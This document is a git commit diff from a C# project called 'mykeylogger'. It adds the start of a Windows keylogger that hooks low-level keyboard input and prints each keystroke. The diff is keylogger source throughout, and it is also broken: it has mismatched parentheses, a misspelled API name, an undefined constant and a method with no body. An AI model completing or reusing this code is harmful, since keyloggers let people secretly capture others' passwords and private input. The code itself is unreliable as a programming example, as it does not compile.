6064c0a2efc0432b6a94af3ad043c8031fcff553
James Scipio McCaffrey <jsmccaffrey@gmail.com>
2024-04-21 19:04:46 -0700

    Work in progress

--- mykeylogger/Program.cs
+++ mykeylogger/Program.cs
@@ -1,9 +1,43 @@
-﻿namespace mykeylogger
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Windows.Forms;
+
+namespace mykeylogger
 {
-    internal class Program
+    class Program
     {
+        private static int WH_KEYBARD_LL = 13;
+        private static int WH_KEYDOWN = 0x0100;
+        private static IntPtr hook = IntPtr.Zero;
+        private static LowLevelKeyboardProc llkProcedure = HookCallback;
+        
         static void Main(string[] args)
         {
+            hook = SetHook(llkProcedure);
+            Application.Run();
+            UnhookwindowsHookEx(hook);
         }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode) >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                Console.Out.Write((Keys)vkCode);
+            }
+            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+
+        {DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
     }
 }
